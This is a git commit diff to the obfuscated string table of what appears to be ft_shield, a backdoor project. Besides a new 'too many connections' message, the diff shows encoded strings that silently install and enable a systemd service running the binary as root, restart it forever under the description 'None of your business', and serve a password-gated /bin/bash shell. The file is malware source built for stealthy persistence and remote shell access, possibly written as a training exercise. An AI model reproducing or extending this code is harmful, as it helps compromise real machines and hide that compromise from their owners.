1ac9956d27a84ca92780a910c6a8b30d962ed233
Felix Brüggemann <57171559+FelixBrgm@users.noreply.github.com>
2025-08-01 14:35:45 +0000

    foratting and adding too_many_connections error string

--- codegen/constants.h
+++ codegen/constants.h
@@ -16,6 +16,7 @@ typedef enum ObfuscatedStringTableIndex {
     INVALID_PASSWORD_TRY_AGAIN,
     LOGIN_SUCCESSFUL,
     BIN_BASH,
+    TOO_MANY_CONNECTIONS,
 } ObfuscatedStringTableIndex;
 
 // Will be preprocessed for codegen by scripts/encode.py
@@ -27,12 +28,15 @@ static uint8_t systemctl_daemon_reload[] = OBFUSCATE("systemctl daemon-reload > 
 static uint8_t systemctl_start_ft_shield[] = OBFUSCATE("systemctl start ft_shield > /dev/null 2>&1");
 static uint8_t systemctl_stop_ft_shield[] = OBFUSCATE("systemctl stop ft_shield > /dev/null 2>&1");
 static uint8_t systemctl_enable_ft_shield[] = OBFUSCATE("systemctl enable ft_shield > /dev/null 2>&1");
-static uint8_t systemd_config[] = OBFUSCATE("[Unit]\nDescription=None of your business G\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/bin/ft_shield %s\n\n[Install]\nWantedBy=multi-user.target\n");
+static uint8_t systemd_config[] = OBFUSCATE("[Unit]\nDescription=None of your business "
+                                            "G\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType="
+                                            "simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/bin/ft_shield "
+                                            "%s\n\n[Install]\nWantedBy=multi-user.target\n");
 static uint8_t systemd_config_path[] = OBFUSCATE("/etc/systemd/system/ft_shield.service");
 static uint8_t invalid_password_try_again[] = OBFUSCATE("Invalid password, try again\n");
 static uint8_t login_successful[] = OBFUSCATE("Login successful\n");
 static uint8_t bin_bash[] = OBFUSCATE("/bin/bash");
-
+static uint8_t too_many_connections[] = OBFUSCATE("too many connections already in use\n");
 
 static ObfuscatedStringTableEntry strings[] = {
     {.data = (uint8_t *)proc_self_exe,              .len = sizeof(proc_self_exe),              .decoded = false},
@@ -46,6 +50,7 @@ static ObfuscatedStringTableEntry strings[] = {
     {.data = (uint8_t *)invalid_password_try_again, .len = sizeof(invalid_password_try_again), .decoded = false},
     {.data = (uint8_t *)login_successful,           .len = sizeof(login_successful),           .decoded = false},
     {.data = (uint8_t *)bin_bash,                   .len = sizeof(bin_bash),                   .decoded = false},
+    {.data = (uint8_t *)too_many_connections,       .len = sizeof(too_many_connections),       .decoded = false},
 };
 
 #endif
